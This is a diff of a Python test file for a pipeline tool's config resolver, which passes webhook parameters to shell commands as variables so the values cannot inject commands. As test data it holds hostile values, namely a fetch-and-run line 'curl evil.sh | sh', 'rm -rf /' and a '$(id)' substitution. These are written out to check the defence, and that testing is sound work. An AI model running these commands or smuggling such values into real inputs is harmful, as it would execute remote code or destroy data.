@@ -153,42 +153,99 @@ def test_references_in_lists_every_reference_a_value_names() -> None:
     assert references_in("no references here") == []
 
 
-def test_a_value_interpolated_into_a_shell_command_becomes_exactly_one_word() -> None:
+def test_a_value_interpolated_into_a_shell_command_never_reaches_the_shells_parser() -> None:
     """The injection this closes is reachable by anyone who can POST to a webhook."""
     scope = ReferenceScope(params={"region": "x; curl evil.sh | sh"})
     resolved = resolve_config({"command": "load ${params.region}"}, scope, shell_fields={"command"})
-    assert resolved["command"] == "load 'x; curl evil.sh | sh'"
+    assert resolved["command"] == 'load "$DIRIGENT_V0"'
+    assert resolved["shell_variables"] == {"DIRIGENT_V0": "x; curl evil.sh | sh"}
 
 
-def test_shell_quoting_leaves_the_metacharacters_the_author_typed_alone() -> None:
+def test_a_reference_the_author_quoted_takes_no_quotes_of_its_own() -> None:
+    """``echo "${x}"`` is what shell quoting could not close: there the quotes were the value's."""
+    scope = ReferenceScope(params={"region": "$(id) two words"})
+    resolved = resolve_config({"command": 'load "${params.region}"'}, scope, shell_fields={"command"})
+    assert resolved["command"] == 'load "$DIRIGENT_V0"'
+    assert resolved["shell_variables"] == {"DIRIGENT_V0": "$(id) two words"}
+
+
+def test_a_reference_inside_the_authors_single_quotes_is_the_text_the_shell_says_it_is() -> None:
+    """Single quotes are literal to a shell, so what they hold is the variable and not its value."""
+    scope = ReferenceScope(params={"region": "oslo"})
+    resolved = resolve_config({"command": "load '${params.region}'"}, scope, shell_fields={"command"})
+    assert resolved["command"] == "load '$DIRIGENT_V0'"
+    assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}
+
+
+def test_the_quoting_a_reference_lands_in_is_read_through_escapes_and_nesting() -> None:
+    """Every form a command writes quotes in, so a value keeps its word boundaries in each."""
+    scope = ReferenceScope(params={"x": "a b"})
+    commands = {
+        'echo \\"${params.x}': 'echo \\""$DIRIGENT_V0"',
+        'echo "it\\"${params.x}"': 'echo "it\\"$DIRIGENT_V0"',
+        'echo "$(cat "${params.x}")"': 'echo "$(cat "$DIRIGENT_V0")"',
+        'echo "$(cat ${params.x})"': 'echo "$(cat "$DIRIGENT_V0")"',
+        "echo `cat ${params.x}`": 'echo `cat "$DIRIGENT_V0"`',
+        "echo 'it'${params.x}": "echo 'it'\"$DIRIGENT_V0\"",
+    }
+    for command, expected in commands.items():
+        assert resolve_config({"command": command}, scope, shell_fields={"command"})["command"] == expected
+
+
+def test_each_reference_in_a_command_gets_a_variable_of_its_own() -> None:
+    scope = ReferenceScope(params={"region": "oslo", "day": "2026-08-28"})
+    resolved = resolve_config(
+        {"command": "load ${params.region} ${params.day} ${params.region}"}, scope, shell_fields={"command"}
+    )
+    assert resolved["command"] == 'load "$DIRIGENT_V0" "$DIRIGENT_V1" "$DIRIGENT_V2"'
+    assert resolved["shell_variables"] == {
+        "DIRIGENT_V0": "oslo",
+        "DIRIGENT_V1": "2026-08-28",
+        "DIRIGENT_V2": "oslo",
+    }
+
+
+def test_substitution_leaves_the_metacharacters_the_author_typed_alone() -> None:
     """A pipe the pipeline author wrote is the reason the shell form exists at all."""
     scope = ReferenceScope(params={"name": "oslo"})
     resolved = resolve_config({"command": "cat ${params.name}.csv | wc -l"}, scope, shell_fields={"command"})
-    assert resolved["command"] == "cat oslo.csv | wc -l"
+    assert resolved["command"] == 'cat "$DIRIGENT_V0".csv | wc -l'
+    assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}
 
 
-def test_a_command_that_is_entirely_a_reference_is_still_quoted() -> None:
+def test_a_command_that_is_entirely_a_reference_is_one_word_and_not_a_program() -> None:
     """Otherwise a parameter is not an argument to a program, it *is* the program."""
     scope = ReferenceScope(params={"cmd": "rm -rf /"})
     resolved = resolve_config({"command": "${params.cmd}"}, scope, shell_fields={"command"})
-    assert resolved["command"] == "'rm -rf /'"
+    assert resolved["command"] == '"$DIRIGENT_V0"'
+    assert resolved["shell_variables"] == {"DIRIGENT_V0": "rm -rf /"}
 
 
-def test_only_the_fields_the_block_marked_are_quoted() -> None:
-    """Quoting a value that is not going to a shell would corrupt it."""
+def test_only_the_fields_the_block_marked_are_rewritten() -> None:
+    """Rewriting a value that is not going to a shell would corrupt it."""
     scope = ReferenceScope(params={"region": "a b"})
     resolved = resolve_config(
         {"command": "echo ${params.region}", "argv": ["echo", "${params.region}"], "cwd": "${params.region}"},
         scope,
         shell_fields={"command"},
     )
-    assert resolved["command"] == "echo 'a b'"
+    assert resolved["command"] == 'echo "$DIRIGENT_V0"'
     assert resolved["argv"] == ["echo", "a b"]
     assert resolved["cwd"] == "a b"
+    assert resolved["shell_variables"] == {"DIRIGENT_V0": "a b"}
 
 
-def test_nothing_is_quoted_when_no_field_was_marked(scope: ReferenceScope) -> None:
-    assert resolve_config({"command": "echo ${item}"}, scope)["command"] == "echo oslo"
+def test_nothing_is_rewritten_and_no_variables_are_carried_when_no_field_was_marked(scope: ReferenceScope) -> None:
+    resolved = resolve_config({"command": "echo ${item}"}, scope)
+    assert resolved == {"command": "echo oslo"}
+
+
+def test_a_document_cannot_carry_its_own_shell_variables(scope: ReferenceScope) -> None:
+    """Whatever a stored document put there, the resolution is what the block is handed."""
+    resolved = resolve_config(
+        {"command": "echo ${item}", "shell_variables": {"DIRIGENT_V0": "mine"}}, scope, shell_fields={"command"}
+    )
+    assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}
 
 
 def test_an_escaped_reference_yields_the_literal_braces(scope: ReferenceScope) -> None:
@@ -220,10 +277,11 @@ def test_an_escaped_reference_is_text_even_when_it_is_the_whole_value(scope: Ref
     assert resolve("$${params.count}", scope) == "${params.count}"
 
 
-def test_an_escaped_reference_reaches_a_shell_unquoted(scope: ReferenceScope) -> None:
+def test_an_escaped_reference_reaches_a_shell_as_the_text_it_is(scope: ReferenceScope) -> None:
     """It is text the author typed, so it keeps its meaning to the shell like any other."""
     resolved = resolve_config({"command": "echo $${HOME} ${item}"}, scope, shell_fields={"command"})
-    assert resolved["command"] == "echo ${HOME} oslo"
+    assert resolved["command"] == 'echo ${HOME} "$DIRIGENT_V0"'
+    assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}
 
 
 def test_an_escaped_reference_is_not_a_reference_the_document_names(scope: ReferenceScope) -> None:
@@ -250,7 +308,8 @@ def test_everything_that_resolved_before_the_escape_resolves_identically(scope: 
     }
     assert resolve("$5 and 100%", scope) == "$5 and 100%"
     assert resolve("{not a reference}", scope) == "{not a reference}"
-    assert resolve_config({"command": "echo ${item}"}, scope, shell_fields={"command"})["command"] == "echo oslo"
+    shell = resolve_config({"command": "echo ${item}"}, scope, shell_fields={"command"})
+    assert shell["command"] == 'echo "$DIRIGENT_V0"'
 
 
 @pytest.fixture
